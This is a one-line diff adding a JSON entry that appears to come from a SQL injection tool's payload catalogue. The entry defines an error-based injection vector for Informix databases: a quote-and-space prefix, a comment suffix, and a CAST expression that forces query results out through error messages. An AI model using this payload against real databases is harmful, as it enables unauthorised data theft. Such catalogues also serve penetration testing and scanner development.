@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "error", "boundary": {"prefix": "' ", "suffix": "-- -", "type": "single-ws"}, "vector": "{B} AND 1=(SELECT CAST(({Q}) AS INT))", "comment": "informix error: single trailing ws"}
